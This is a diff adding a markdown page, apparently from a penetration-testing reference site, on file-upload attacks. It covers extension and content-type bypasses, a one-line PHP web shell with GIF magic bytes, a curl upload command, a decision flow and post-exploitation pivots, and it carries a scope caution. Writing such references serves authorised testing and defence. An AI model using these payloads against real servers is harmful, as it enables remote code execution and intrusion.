@@ -1,0 +1,165 @@
+---
+title: File Upload
+description: Operator reference for file-upload attacks - arbitrary file upload, client-side bypass, extension blacklist/whitelist bypass, content-type spoofing, and limited-upload attack chains (XSS, XXE, DoS).
+mitre: [T1190, T1505.003, T1059]
+d3fend: [D3-EAL, D3-FA]
+impact: [RCE, ServerSideEval, FileWrite]
+owasp: [A03, A04, A05]
+noise: moderate
+sidebar:
+  order: 1
+  label: Overview
+---
+import { Aside } from '@astrojs/starlight/components';
+
+## TL;DR
+
+The application accepts uploads from users. Validation is missing or weak. The operator uploads a file that gets stored in a web-served directory, requests the URL, the server executes the file. RCE in three or four requests.
+
+```
+# 1. Find a parameter that accepts file uploads
+POST /upload    multipart/form-data    filename="X.php"  content="<?php ..."
+
+# 2. If validation is client-side only, bypass via direct request
+curl -F "file=@shell.php" https://target/upload
+
+# 3. If extension blacklist - use a less-common executable extension
+shell.phtml   shell.phar   shell.php5   shell.pHp
+
+# 4. If extension whitelist - chain extensions or inject characters
+shell.jpg.php       (double extension)
+shell.php.jpg       (reverse - Apache misconfig)
+shell.php%00.jpg    (null byte - PHP <5.3.4)
+
+# 5. If content-type validated - magic bytes + Content-Type spoof
+GIF8<?php system($_GET["cmd"]); ?>   with   Content-Type: image/gif
+
+# 6. Visit the uploaded file
+https://target/uploads/shell.phar?cmd=id
+→ uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+Success indicator: command output (or file contents, or browser-side XSS execution) in the response after triggering the uploaded file.
+
+## Where this lives
+
+Anywhere the application takes a file from the user and stores it server-side:
+
+- **Profile / avatar upload** - almost universal on apps with user accounts
+- **Document attachment** - tickets, comments, support forms
+- **Bulk import** - CSV/Excel/XML import features
+- **Resume / CV upload** - job-board apps
+- **Logo / brand image** - admin settings
+- **Image upload in CMS / wiki editors**
+- **Feedback or contact forms with file attachment**
+- **Cloud storage features** - Drive-clone apps
+- **File-conversion services** - PDF converters, image resizers
+
+If the application has a file-selector dialog anywhere, this section applies.
+
+## Validation taxonomy
+
+Applications typically combine several validation layers. Each has its own bypass class:
+
+| Validation type | What it checks | Bypass |
+| --- | --- | --- |
+| Client-side (JS) | File extension via JavaScript, MIME-type dialog | Request manipulation, JS disable |
+| Extension blacklist | File extension against a deny-list | Uncommon extensions, case manipulation |
+| Extension whitelist | File extension against an allow-list | Double extension, character injection |
+| Content-Type header | The HTTP `Content-Type` header on the upload | Spoof the header to a permitted value |
+| Magic bytes / MIME sniffing | First bytes of file content | Prepend valid magic bytes to malicious content |
+| File-size limit | Bytes in the file | Either compress the payload or accept reduced payloads |
+| Filename sanitization | Path traversal, special chars in filename | Encoding, alternate path separators |
+
+A complete bypass on a hardened app may need to satisfy three or four of these simultaneously.
+
+## Decision flow
+
+```
+1. What validations are in place?
+   ├─ No validation        → just upload your shell        → done
+   ├─ Client-side only     → see Client-side bypass
+   ├─ Extension blacklist  → see Extension blacklist
+   ├─ Extension whitelist  → see Extension whitelist
+   └─ Content validation   → see Content-Type bypass
+
+2. After upload - where did it go?
+   ├─ Known URL path       → visit it directly
+   ├─ Random/hashed name   → check the upload response, page source, or fuzz
+   └─ Hidden entirely      → see post-upload § directory disclosure
+
+3. Did execution work?
+   ├─ Yes, command output  → done
+   ├─ Source code shown    → wrong execution context - try .phar, .phtml, .phps
+   ├─ "Forbidden" / 403    → upload-dir has script execution disabled - try LFI chain
+   └─ "Not found" / 404    → upload path wrong - see post-upload § directory disclosure
+
+4. Arbitrary upload not possible - what attacks remain?
+   ├─ HTML upload?         → Stored XSS         → see Limited uploads
+   ├─ SVG upload?          → XSS or XXE          → see Limited uploads
+   ├─ XML/DOC upload?      → XXE                 → see Limited uploads
+   ├─ ZIP upload?          → Decompression DoS    → see Limited uploads
+   └─ Image upload only?   → Pixel-flood DoS, EXIF XSS → see Limited uploads
+```
+
+## Decision-flow page links
+
+1. **First upload attempt - find a working extension** → [Shells](/codex/web/uploads/shells/)
+2. **Client-side JS validation blocks the upload?** → [Client-side bypass](/codex/web/uploads/client-side-bypass/)
+3. **Extension blacklist in the response error?** → [Extension blacklist](/codex/web/uploads/extension-blacklist/)
+4. **Extension whitelist (only images allowed)?** → [Extension whitelist](/codex/web/uploads/extension-whitelist/)
+5. **Content-Type / MIME validation?** → [Content-Type bypass](/codex/web/uploads/content-type-bypass/)
+6. **Only specific non-executable types allowed?** → [Limited uploads](/codex/web/uploads/limited-uploads/)
+7. **Need to find the upload directory, or filename injection?** → [Post-upload](/codex/web/uploads/post-upload/)
+
+## Impact ladder
+
+| Tier | What you can do | Path |
+| --- | --- | --- |
+| 1 | Confirm upload accepted | Any payload that returns "success" |
+| 2 | Stored XSS via HTML/SVG/EXIF | Limited-upload chain - see Limited uploads |
+| 3 | File read / SSRF via SVG-XXE | Limited-upload chain - XXE in SVG |
+| 4 | Overwrite arbitrary files | Filename path traversal in upload |
+| 5 | RCE via uploaded executable | Standard upload-shell path |
+
+Most engagements aim for Tier 5 directly when the validation gaps allow. Tiers 2-4 are the fallbacks when arbitrary executable upload is locked down - and they're still serious findings.
+
+## Operating notes
+
+**Identify the framework first.** PHP, .NET, Java, NodeJS - each needs a different shell. A PHP web shell on a Java app does nothing. Quick checks:
+
+- Visit `/index.php`, `/index.aspx`, `/index.jsp` - whichever resolves identifies the framework
+- Wappalyzer browser extension shows the stack in one click
+- Server response headers (`Server`, `X-Powered-By`) often reveal it
+- File extensions in the application's normal URLs
+
+**Test a Hello-World payload before a shell.** Upload a file with `<?php echo "OK"; ?>` first. If you see `OK` in the response when you visit the upload, the framework is executing the file - proceed with a real shell. If you see the source code, the upload directory doesn't execute scripts and you need a different path (LFI chain, different filename).
+
+**The uploaded file's URL is the bottleneck.** A successful upload that you can't find is useless. Check:
+- Direct response from the upload endpoint (sometimes returns the URL)
+- View source on any page that displays the upload (`<img src="...">` reveals path)
+- Common upload directories: `/uploads/`, `/files/`, `/avatars/`, `/profile_images/`, `/media/`
+- Fuzz with directory wordlists if all else fails
+
+<Aside type="caution">
+A working file-upload-to-RCE reaches the server with full web-application user context. This means file write anywhere the web user can write, command execution at the application's privilege level, and potential pivoting from there. Demonstrate at the `id` / `whoami` level and stop until scope-confirmed for further work.
+</Aside>
+
+## Cross-references
+
+- **LFI + uploads chain** - when the upload itself is locked down but the application has LFI, you can combine: upload a file with PHP in it (any extension), then include it via the LFI. See [LFI file-upload chain](/codex/web/lfi/file-upload-chain/).
+- **Command injection in filenames** - when the application uses the uploaded filename in a shell command, injection in the name leads to command execution. See [Command Injection](/codex/web/command-injection/) for the technique side; this section covers the upload-specific delivery.
+
+The [Shells](/codex/web/uploads/shells/) page is the right starting point if you've confirmed an upload works and need a payload. The bypass pages assume you've tried the simple case and hit a filter.
+
+## Next move
+
+- **Upload accepted as-is, file accessible at `/uploads/shell.php`** → drop a [web shell](/codex/web/uploads/shells/) and pivot to OS shell
+- **Upload accepted but file not accessible (returns 404)** → use [post-upload techniques](/codex/web/uploads/post-upload/) - find where files actually land, try directory traversal in the filename, or chain with [LFI](/codex/web/lfi/) to include the uploaded file
+- **JavaScript blocks the upload on the client** → [client-side bypass](/codex/web/uploads/client-side-bypass/) - disable JS, use Burp Repeater, manipulate request directly
+- **Extension blacklist (rejects `.php`, `.asp`, etc.)** → [extension-blacklist bypass](/codex/web/uploads/extension-blacklist/) (`.phtml`, `.php5`, `.phar`, case variants, double extensions)
+- **Extension whitelist (only allows `.jpg`/`.png`)** → [extension-whitelist bypass](/codex/web/uploads/extension-whitelist/) - content-type-only checks, magic-byte spoofing, polyglot files
+- **Content-Type validated, extension restricted** → [content-type bypass](/codex/web/uploads/content-type-bypass/) - spoof `Content-Type: image/jpeg` while smuggling PHP
+- **Only images allowed and properly validated** → [limited uploads](/codex/web/uploads/limited-uploads/) - even constrained uploads can serve XSS (SVG with `<script>`), XXE (DOCX/XLSX/SVG with XML), or stored payloads
+- **Got web shell but command execution disabled** → check `disable_functions` in php.ini; try alternate execution sinks (`proc_open`, `popen`, `pcntl_exec`); look for SUID binaries on disk
+- **Web shell as `www-data` / IIS app pool** → on Windows pivot to [SeImpersonate](/codex/windows/privesc/seimpersonate/); on Linux look for [credential files](/codex/web/lfi/) and SUID binaries
